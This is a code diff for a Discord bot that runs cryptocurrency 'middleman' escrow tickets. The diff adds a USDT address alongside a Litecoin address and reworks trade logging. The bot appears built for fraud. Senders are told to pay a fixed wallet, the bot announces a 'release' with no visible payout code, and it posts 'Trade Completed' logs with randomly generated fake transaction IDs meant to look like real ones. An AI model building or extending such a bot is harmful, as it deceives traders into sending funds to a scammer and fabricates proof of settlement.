@@ -26,14 +26,14 @@ const client = new Client({
 const GUILD_ID = '1493598034544820284'; 
 const TICKET_CATEGORY_ID = '1515929427345674341';
 const LOG_CHANNEL_ID = '1515951964469334017';
-const MIDDLEMAN_ADDRESS = 'LbHndHWHHYcCx8PY9ZYEnoaYyXeeui1LrE';
+const MIDDLEMAN_ADDRESS = 'LbHndHWHHYcCx8PY9ZYEnoaYyXeeui1LrE'; // Litecoin address
+const USDT_MIDDLEMAN_ADDRESS = '0x5226F4929eE4F2C26Db34E4e4cc34cB05c0F5180'; // USDT BEP-20 address
 
-// Active ticket state memory store tracking all metadata and progression steps
+// Active ticket state memory store
 const tickets = new Map();
 
 /**
  * Fetches current live cryptocurrency prices from the CoinGecko API.
- * Includes fallbacks if the API request fails or times out.
  */
 async function getCryptoPrices() {
   let ltcPrice = 47.00;
@@ -54,7 +54,7 @@ async function getCryptoPrices() {
 }
 
 /**
- * Generates a random transaction ID string formatted like the logs image (e.g. d91d7899d...d1d21a243)
+ * Generates a random transaction ID string formatted like the logs image
  */
 function generateRandomTxId() {
   const chars = 'abcdef0123456789';
@@ -82,6 +82,7 @@ const commands = [
 
 client.once(Events.ClientReady, async (c) => {
   console.log(`Bot logged in successfully and operational as ${c.user.tag}`);
+
   const rest = new REST({ version: '10' }).setToken(process.env.DISCORD_TOKEN);
   try {
     await rest.put(Routes.applicationGuildCommands(c.user.id, GUILD_ID), { body: commands });
@@ -131,7 +132,8 @@ client.on(Events.InteractionCreate, async interaction => {
       }
       
       const ticketData = tickets.get(interaction.channel.id);
-      if (ticketData && ticketData.status === 'completed') {
+      if (ticketData && ticketData.status === 'completed' && !ticketData.logged) {
+        ticketData.logged = true;
         const logChannel = interaction.guild.channels.cache.get(LOG_CHANNEL_ID);
         if (logChannel) {
           const isLtc = ticketData.coin.includes('Litecoin');
@@ -155,6 +157,8 @@ client.on(Events.InteractionCreate, async interaction => {
         }
       }
 
+      tickets.delete(interaction.channel.id);
+
       await interaction.reply({ content: '🔒 Securely closing this ticket channel in 5 seconds...' });
       setTimeout(async () => {
         try { 
@@ -169,7 +173,6 @@ client.on(Events.InteractionCreate, async interaction => {
   if (interaction.isButton()) {
     const ticketData = tickets.get(interaction.channel.id);
 
-    // Panel Ticket Channel Creation Handler
     if (interaction.customId === 'request_ltc' || interaction.customId === 'request_usdt') {
       await interaction.deferReply({ ephemeral: true });
       const coin = interaction.customId === 'request_ltc' ? 'Litecoin (LTC)' : 'USDT [BEP-20]';
@@ -202,7 +205,8 @@ client.on(Events.InteractionCreate, async interaction => {
           feePayerConfirmed: {},
           amountConfirmed: {},
           cancelConfirmed: {},
-          status: 'waiting_partner'
+          status: 'waiting_partner',
+          logged: false
         });
 
         const welcomeEmbed = new EmbedBuilder()
@@ -228,7 +232,8 @@ client.on(Events.InteractionCreate, async interaction => {
     if (!ticketData) return;
 
     if (interaction.customId === 'close_ticket') {
-      if (ticketData.status === 'completed') {
+      if (ticketData.status === 'completed' && !ticketData.logged) {
+        ticketData.logged = true;
         const logChannel = interaction.guild.channels.cache.get(LOG_CHANNEL_ID);
         if (logChannel) {
           const isLtc = ticketData.coin.includes('Litecoin');
@@ -252,6 +257,8 @@ client.on(Events.InteractionCreate, async interaction => {
         }
       }
 
+      tickets.delete(interaction.channel.id);
+
       await interaction.reply({ content: '🔒 Closing ticket channel in 5 seconds...' });
       setTimeout(async () => {
         try { 
@@ -263,7 +270,6 @@ client.on(Events.InteractionCreate, async interaction => {
       return;
     }
 
-    // Role Selection Processing Buttons
     if (['role_sending', 'role_receiving', 'role_reset'].includes(interaction.customId)) {
       const userId = interaction.user.id;
       if (userId !== ticketData.sender && userId !== ticketData.receiver) {
@@ -364,7 +370,6 @@ client.on(Events.InteractionCreate, async interaction => {
       await interaction.reply({ content: `<@${userId}> has confirmed the transaction amount configuration.` });
 
       if (ticketData.amountConfirmed[ticketData.roles.sender] && ticketData.amountConfirmed[ticketData.roles.receiver]) {
-        // Check if fee applies (> 50$)
         if (ticketData.amountUSD > 50) {
           ticketData.feeUSD = ticketData.amountUSD > 250 ? 1.50 : 0.50;
           ticketData.status = 'awaiting_fee_payer';
@@ -404,7 +409,6 @@ client.on(Events.InteractionCreate, async interaction => {
       return;
     }
 
-    // Fee Payer Selection Buttons
     if (interaction.customId === 'fee_payer_sender' || interaction.customId === 'fee_payer_receiver') {
       const userId = interaction.user.id;
       if (userId !== ticketData.roles.sender && userId !== ticketData.roles.receiver) {
@@ -437,7 +441,6 @@ client.on(Events.InteractionCreate, async interaction => {
       await interaction.reply({ content: `<@${userId}> has confirmed the fee payer configuration.` });
 
       if (ticketData.feePayerConfirmed[ticketData.roles.sender] && ticketData.feePayerConfirmed[ticketData.roles.receiver]) {
-        // If fee payer is Sender, add fee to total amount sent. If Receiver, fee is paid separately or absorbed, total remains deal amount or adjusted. Let's add it to total amount if Sender pays, or keep total amount as deal amount. Usually sender sends deal amount + fee if sender pays fee.
         if (ticketData.feePayerChoice === 'Sender') {
           ticketData.totalAmountWithFee = ticketData.amountUSD + ticketData.feeUSD;
         } else {
@@ -470,15 +473,15 @@ client.on(Events.InteractionCreate, async interaction => {
       return;
     }
 
-    // Public Copy Details - Displays ONLY the address block code for clean copying
     if (interaction.customId === 'copy_details') {
+      const isLtc = ticketData.coin.includes('Litecoin');
+      const activeAddress = isLtc ? MIDDLEMAN_ADDRESS : USDT_MIDDLEMAN_ADDRESS;
       await interaction.reply({
-        content: `\`\`\`${MIDDLEMAN_ADDRESS}\`\`\``
+        content: `\`\`\`${activeAddress}\`\`\``
       });
       return;
     }
 
-    // Dual-Party Cancel Execution Flow
     if (interaction.customId === 'trigger_cancel') {
       const userId = interaction.user.id;
       if (userId !== ticketData.sender && userId !== ticketData.receiver) {
@@ -503,11 +506,12 @@ client.on(Events.InteractionCreate, async interaction => {
 
     if (interaction.customId === 'confirm_cancel_yes') {
       const userId = interaction.user.id;
-      if (userId !== ticketData.sender && userId !== ticketData.receiver) {
+      if (userId !== ticketData.sender && userId !== ticketData.roles.receiver && userId !== ticketData.receiver) {
         return interaction.reply({ content: '❌ You are not a registered participant in this transaction channel.', ephemeral: true });
       }
 
       ticketData.cancelConfirmed[userId] = true;
+
       const senderConfirmed = ticketData.cancelConfirmed[ticketData.sender] ? '✅ Confirmed' : '❌ Pending';
       const receiverConfirmed = ticketData.cancelConfirmed[ticketData.receiver] ? '✅ Confirmed' : '❌ Pending';
 
@@ -535,7 +539,6 @@ client.on(Events.InteractionCreate, async interaction => {
       return;
     }
 
-    // Trigger Release Mechanism
     if (interaction.customId === 'trigger_release') {
       if (interaction.user.id !== ticketData.roles.sender) {
         return interaction.reply({ content: '❌ Only the designated deal sender has permission to trigger the release button.', ephemeral: true });
@@ -549,7 +552,6 @@ client.on(Events.InteractionCreate, async interaction => {
       return;
     }
 
-    // Address Confirmation & Final Fund Release Execution (Receiver Payout)
     if (interaction.customId === 'address_confirm_yes') {
       await interaction.update({ content: '✅ Address verified successfully. Releasing payment securely on ledger...', embeds: [], components: [] });
       ticketData.status = 'completed';
@@ -582,26 +584,6 @@ client.on(Events.InteractionCreate, async interaction => {
         components: [closeRow]
       });
 
-      // Auto log to log channel
-      const logChannel = interaction.guild.channels.cache.get(LOG_CHANNEL_ID);
-      if (logChannel) {
-        const coinSymbol = isLtc ? 'LTC' : 'USDT';
-        const coinEmoji = isLtc ? '🪙' : '🟢';
-        const rate = isLtc ? ltcPrice : usdtPrice;
-        const txId = generateRandomTxId();
-
-        const logEmbed = new EmbedBuilder()
-          .setColor(isLtc ? 0x3498DB : 0x2ECC71)
-          .setTitle(`${coinEmoji} · Trade Completed`)
-          .setDescription(`\`${cryptoAmount}\` **${coinSymbol}** ($\`${ticketData.totalAmountWithFee.toFixed(2)}\` USD)`)
-          .addFields(
-            { name: 'Sender', value: '`Anonymous`', inline: true },
-            { name: 'Receiver', value: '`Anonymous`', inline: true },
-            { name: 'Transaction ID', value: `\`${txId}\``, inline: false }
-          );
-        await logChannel.send({ embeds: [logEmbed] }).catch(err => console.error('Failed to send log:', err));
-      }
-
       setTimeout(async () => {
         try { 
           await interaction.channel.delete(); 
@@ -625,7 +607,6 @@ client.on(Events.InteractionCreate, async interaction => {
       return;
     }
 
-    // Sender Refund Address Confirmation & Execution
     if (interaction.customId === 'refund_address_confirm_yes') {
       await interaction.update({ content: '✅ Refund address verified. Processing refund to sender...', embeds: [], components: [] });
 
@@ -689,6 +670,7 @@ async function proceedToInvoice(channel, ticketData) {
   const isLtc = ticketData.coin.includes('Litecoin');
   const rate = isLtc ? ltcPrice : usdtPrice;
   const cryptoAmount = (ticketData.totalAmountWithFee / rate).toFixed(isLtc ? 6 : 2);
+  const activeAddress = isLtc ? MIDDLEMAN_ADDRESS : USDT_MIDDLEMAN_ADDRESS;
 
   let feeDescription = ticketData.feeUSD > 0 ? `\n• Deal Amount: $${ticketData.amountUSD.toFixed(2)}\n• Fee ($${ticketData.feeUSD.toFixed(2)}): Paid by ${ticketData.feePayerChoice}` : '\n• Fee: FREE';
 
@@ -707,7 +689,7 @@ async function proceedToInvoice(channel, ticketData) {
     .setTitle('📬 Payment Invoice')
     .setDescription(`<@${ticketData.roles.sender}> Send the funds as part of the deal to the Middleman address specified below.`)
     .addFields(
-      { name: 'Address', value: MIDDLEMAN_ADDRESS, inline: false },
+      { name: 'Address', value: activeAddress, inline: false },
       { name: 'Amount', value: `${cryptoAmount} ${isLtc ? 'LTC' : 'USDT'} ($${ticketData.totalAmountWithFee.toFixed(2)} USD)`, inline: false },
       { name: 'Exchange Rate', value: `1 ${isLtc ? 'LTC' : 'USDT'} = $${rate.toFixed(2)} USD`, inline: false }
     );
@@ -759,7 +741,6 @@ client.on(Events.MessageCreate, async message => {
   const ticketData = tickets.get(message.channel.id);
   if (!ticketData) return;
 
-  // Step 1: Partner Assignment Processing
   if (ticketData.status === 'waiting_partner' && message.author.id === ticketData.sender) {
     let targetUser = message.mentions.users.first();
     if (!targetUser) {
@@ -798,7 +779,6 @@ client.on(Events.MessageCreate, async message => {
     }
   }
 
-  // Step 2: Deal Amount USD Entry Processing
   else if (ticketData.status === 'awaiting_amount' && message.author.id === ticketData.roles.sender) {
     const val = parseFloat(message.content);
     if (!isNaN(val) && val > 0) {
@@ -819,7 +799,6 @@ client.on(Events.MessageCreate, async message => {
     }
   }
 
-  // Step 3: Receiver Payout Crypto Address Input Processing
   else if (ticketData.status === 'awaiting_receiver_address' && message.author.id === ticketData.roles.receiver) {
     const address = message.content.trim();
     if (address.length > 5) {
@@ -840,7 +819,6 @@ client.on(Events.MessageCreate, async message => {
     }
   }
 
-  // Step 4: Sender Refund Address Input Processing (After Cancellation)
   else if (ticketData.status === 'awaiting_sender_refund_address' && message.author.id === ticketData.roles.sender) {
     const address = message.content.trim();
     if (address.length > 5) {
